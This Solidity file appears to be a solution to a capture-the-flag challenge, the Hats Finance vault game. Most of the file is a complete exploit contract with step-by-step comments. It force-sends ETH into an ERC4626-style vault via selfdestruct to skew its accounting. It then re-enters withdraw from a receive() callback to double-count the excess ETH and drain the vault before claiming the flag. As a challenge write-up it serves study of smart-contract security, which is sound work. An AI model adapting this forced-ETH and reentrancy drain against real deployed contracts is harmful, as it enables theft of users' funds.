// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.12;

interface IVault {
    function flagHolder() external returns (address);

    function captureTheFlag(address newFlagHolder) external;

    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) external returns (uint256);
}

contract UncheckedETHSender {
    function sendETHUnchecked(address payable _to) external payable {
        selfdestruct(_to);
    }
}

contract Capture {
    event log_uint(uint256);
    error WrongValue();
    error Rekt();

    bool internal attacked;

    function capture(IVault _vault) external payable {
        if (msg.value != 1 ether) revert WrongValue();

        // 1. Force send ETH to the vault even if the vault has
        // no receive nor fallback function. This happens through
        // selfdestruct and messes up the internal accounting of
        // the contract by introducing a totalAssets/totalSupply
        // discrepancy, which leads to there being excessETH in
        // line 158 of the ERC4626ETH contract
        // (https://github.com/hats-finance/vault-game/blob/main/contracts/ERC4626ETH.sol#L158).
        new UncheckedETHSender().sendETHUnchecked{value: 1 ether}(
            payable(address(_vault))
        );

        // 2. Withdraw nothing from the vault. This doesn't prevent the vault contract from sending
        // value to address(this) and this is why we can exploit reentrancy to double-account for
        // excessETH in _withdraw().
        // Control now passes to the receive function in the contract.
        _vault.withdraw(0, address(this), address(this));

        if (address(_vault).balance != 0) revert Rekt();

        // 4. With the vault contract drained, call the captureFlag function.
        _vault.captureTheFlag(msg.sender);
    }

    receive() external payable {
        // 3. The receive function handles the reentrancy attack to double account excessETH.
        // What happens is that at this point we're at line 162 of the ERC4626ETH contract
        // (https://github.com/hats-finance/vault-game/blob/main/contracts/ERC4626ETH.sol#L162)
        // with excessETH already set to 1 due to what we did in point 1. At this point we can
        // recall the "withdraw none" function. The discrepancy between totalAssets and totalSupply
        // is still there in the contract's state, so the contract logic will still account for
        // 1 excessETH, and it will send that, along with the previous one, to the owner, draining
        // the contract of all ETH, and letting us call the captureFlag function in the process.
        // A check needs to be implemented not to perform the reentrancy logic the second time
        // withdraw is called (a bool is used for that). If that were to happen, the send excess
        // ether logic would revert due to sending more eth than what available.
        if (attacked) return;
        attacked = true;
        IVault(msg.sender).withdraw(0, address(this), address(this));
    }
}
